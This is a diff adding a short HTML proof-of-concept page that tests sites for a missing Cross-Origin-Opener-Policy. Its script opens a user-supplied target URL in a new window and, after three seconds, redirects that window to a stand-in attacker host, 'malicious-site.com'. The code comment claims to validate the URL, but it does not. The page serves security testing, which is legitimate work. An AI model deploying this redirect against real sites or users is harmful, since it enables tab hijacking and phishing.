@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>COOP Vulnerability Test</title>
+</head>
+<body>
+    <h1>Testing COOP Vulnerability</h1>
+    <p>If you are redirected to a different site, the vulnerability exists.</p>
+    <script>
+        // Function to get the target URL from the query string
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Get the target URL
+        const targetUrl = getQueryParam('target');
+
+        // Validate the target URL
+        if (targetUrl) {
+            // Open the legitimate site in a new window
+            let victimWindow = window.open(targetUrl, '_blank');
+
+            // Poll the window to check if it's still open, then redirect
+            let pollTimer = window.setInterval(function() {
+                if (victimWindow && !victimWindow.closed) {
+                    victimWindow.location = 'https://malicious-site.com';
+                    window.clearInterval(pollTimer);
+                }
+            }, 3000); // Check every 3 seconds
+        } else {
+            alert('No target URL provided.');
+        }
+    </script>
+</body>
+</html>
